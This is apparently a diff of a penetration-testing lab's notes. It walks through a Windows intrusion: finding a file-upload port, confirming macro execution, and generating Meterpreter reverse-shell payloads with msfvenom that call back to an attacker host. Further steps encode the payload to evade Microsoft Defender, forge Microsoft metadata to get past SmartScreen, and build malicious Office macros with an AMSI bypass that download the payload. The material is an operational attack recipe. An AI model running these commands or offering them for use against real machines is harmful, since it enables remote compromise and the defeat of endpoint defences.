@@ -10,18 +10,14 @@ set AutoRunScript "migrate -n explorer.exe"
 
 1. Identify the web port on 192.168.49.121  allowing file upload. Upload a doc file which allow which allow [ping marco](/msf/ping.vba) command to verify the target allowing code execution though marco 
 
-Created staged payload
+2. Create stageless tcp raw payload 
 ```
-sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.141 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
+sudo msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.49.141  LPORT=443 -f raw -o tcp.bin
 ```
+3. Patch the payload
+- **encode the payload with custom wrapper to create exe to bypass defender**
+- **append microsoft binary meta data to the payload to bypass smart screen**
 
-Created stageless payload with raw format,
-
-```
-msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.49.141 LPORT=443 -f raw -o /var/www/html/msfstageless.bin
-```
-
-
-[Marco  xor Payload encoder](/msf/payloadencoder.ps)
-
-[Marco full download with asmi](/msf/asmibypasswithxor.vba)
+4. Create malicious marco with amsi bypass and download our malicou payload to remote host, 
+- encode the marco content with powershell  [marco  xor Payload encoder](/msf/payloadencoder.ps)
+- Craft the [marco full download with asmi](/msf/asmibypasswithxor.vba)
